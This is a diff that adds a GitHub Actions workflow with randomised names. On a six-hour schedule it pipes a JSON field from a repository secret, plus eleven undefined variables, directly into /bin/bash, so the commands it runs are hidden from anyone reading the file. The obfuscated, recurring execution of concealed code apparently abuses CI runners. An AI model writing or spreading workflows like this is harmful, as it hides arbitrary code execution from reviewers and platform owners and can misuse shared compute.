@@ -1,0 +1,29 @@
+name: membershipthorns
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: membershipthorns
+        env:
+          xe58: ${{ secrets.xe58 }}
+        run: |
+          echo $xe58 | jq -r .zfru37 | /bin/bash
+          echo $txtjy7974 | jq -r .zu166 | /bin/bash
+          echo $ha54 | jq -r .kmvtj12 | /bin/bash
+          echo $ctwa858 | jq -r .pvz4375 | /bin/bash
+          echo $x8 | jq -r .by7 | /bin/bash
+          echo $bea462 | jq -r .wbr7103 | /bin/bash
+          echo $mhg05947 | jq -r .xa6 | /bin/bash
+          echo $w64 | jq -r .lyeo3 | /bin/bash
+          echo $z75004 | jq -r .vc8367 | /bin/bash
+          echo $t61 | jq -r .q6 | /bin/bash
+          echo $v03873 | jq -r .kitj53199 | /bin/bash
+          echo $pjv552 | jq -r .txb039 | /bin/bash
+
